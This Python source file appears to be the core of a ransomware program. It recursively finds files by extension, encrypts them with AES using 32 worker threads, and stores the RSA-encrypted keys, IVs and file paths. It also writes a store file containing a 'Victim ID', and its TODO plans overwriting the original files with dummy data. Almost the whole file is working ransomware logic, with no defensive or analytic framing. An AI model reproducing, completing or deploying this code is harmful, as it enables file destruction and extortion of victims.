import os
import sys
import base64
import gc
from queue import Queue

import utils
from hasp.AESCipher import AESCipher
from hasp.RSACipher import RSACipher
from aptal import APTAl


"""
TODO:1
    re-write file with dummy data :: OK
    del <object> :: OK
    garbage collection
"""

def isInTargetFiles(extention):
    """
        Binary Search to find extentions in the target files
    """
    left = 0
    right = len(utils.file_extentions) - 1

    while left <= right:
        mid = (left + right)// 2
        current = utils.file_extentions[mid]
        if current  > extention:
            right = mid - 1
        elif current  < extention:
            left = mid + 1
        else:
            return True
    return False

def isValidFile(file_name):
    """
        Determining whether the file is valid or not
    """
    _extention = file_name.split(".")[-1].lower()
    if len(_extention) == 1 or isInTargetFiles(_extention):
        return True
    return False

def startContagion(path,rsapublickey):
    """
        What happening in here:
            - Creating RSA ciphers
            - Create AES key
            - Recon : Find the files we want to encrypt
            - Encrypt the files with multithread option
    """

    rsa_cipher = RSACipher(rsapublickey)

    goodbye_files = Queue()
    aeskey = AESCipher.generate_key(utils.aes_IV_key_length)
    
    # creating multithread encryption workers
    for i in range(32):
        worker = APTAl(i, goodbye_files, aeskey)
        worker.daemon = True
        worker.start()

    with open(utils.aesIV_file_store_path,"ab") as key_storing_file:
        # protection of starting time against manipulation
        key_storing_file.write(base64.b64encode(utils.when_did_i_work.encode())+b"\n")
        # write the AES key to our IV - File storage file
        key_storing_file.write(base64.b64encode(rsa_cipher.encrypt(aeskey)) + b"\n")
        # Recon files
        for directory_path, directories, files in os.walk(path):
            for fiile in files:
                # check the file extention
                if isValidFile(fiile):
                    # IV is created individually for each file
                    iv = AESCipher.generate_key(utils.aes_IV_key_length)
                    fp = os.path.join(directory_path,fiile)
                    # put the iv, file to thread pool
                    goodbye_files.put((iv, fp))
                    # the best way to store IV with RSA encyrption
                    iv = rsa_cipher.encrypt(iv)
                    # to ensure data integrity we used base64
                    iv = base64.b64encode(iv)
                    fp = rsa_cipher.encrypt(fp.encode("utf-8")) # str -> bytes
                    fp = base64.b64encode(fp)
                    key_storing_file.write(iv + b":::::" + fp + b"\n")
                    del iv
                    # gc.collect()

    goodbye_files.join()

    print("FILE ENCRYPTION HAS JUST DONE")

def keyStoreCreate(version,ransomid):

    with open(utils.aesIV_file_store_path,"w") as key_storing_file:
        key_storing_file.write(utils.who_we_are + version + "\n")
        key_storing_file.write(utils.what_is_my_purpose + "\n")
        key_storing_file.write("Your Victim ID : "+ransomid + "\n")
        key_storing_file.write("When did ransomware work : " + utils.when_did_i_work + "\n")
        # and so on
    print("STORE FILE CREATED")

def openVictimInformation():
    print("openVictimInformation")


